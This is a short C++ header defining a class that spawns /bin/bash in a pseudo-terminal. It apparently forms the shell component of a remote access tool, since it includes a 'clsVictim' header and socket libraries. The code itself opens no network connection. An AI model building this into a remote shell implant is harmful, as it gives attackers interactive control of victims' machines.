#include <iostream>
#include <string>
#include <vector>
#include <unistd.h>
#include <pty.h>
#include <termio.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <fcntl.h>

#include "clsEZData.hpp"
#include "clsTools.hpp"
#include "clsVictim.hpp"

class clsShell
{
private:
    int m_nMasterFd;
public:
    clsShell()
    {
        int nMasterFd;
        pid_t pid = forkpty(&nMasterFd, nullptr, nullptr, nullptr);
        if (pid == 0)
        {
            execl("/bin/bash", "/bin/bash", nullptr);
            perror("execl failed");

            return;
        }

        m_nMasterFd = nMasterFd;

        fcntl(m_nMasterFd, F_SETFL, O_NONBLOCK);
        
    }

    ~clsShell() = default;
};
